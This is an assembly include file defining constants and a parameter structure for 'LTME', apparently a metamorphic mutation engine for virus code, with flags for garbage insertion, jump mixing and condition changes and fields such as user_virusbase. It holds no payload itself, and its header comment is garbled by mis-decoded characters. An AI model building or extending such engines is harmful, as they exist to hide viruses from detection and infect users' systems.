;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�
;
;LTME constants & structures
;
;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�
;
;Mutator Flags:


LTMEF_MSTACK	equ		00000001b		; Use stack commands
LTMEF_GARBAGE	equ		00000010b		; Generate garbage
LTMEF_PSWAP	equ		00000100b               ; Mix code with JMP
LTMEF_LSWAP	equ		00001000b               ; Logical exchanges
LTMEF_JCC	equ		00010000b               ; Change Jcc conditions
LTMEF_CMD	equ		00100000b               ; Mutate commands
LTMEF_ALL	equ		00111111b		

;-----------------------------------------------------------------------------

ltmeparam	struc
		build_size	dd	?		; rebuilded code size
		build_offset	dd	?               ; rebuilded code offset

		mixer_maxswp 	dd	?		; maximup blocks swap

		; ... user defined

		user_oldvirsize	dd	?
		user_olddelta	dd	?

		user_virusbase	dd	?
		user_jmpdest	dd	?

		ends
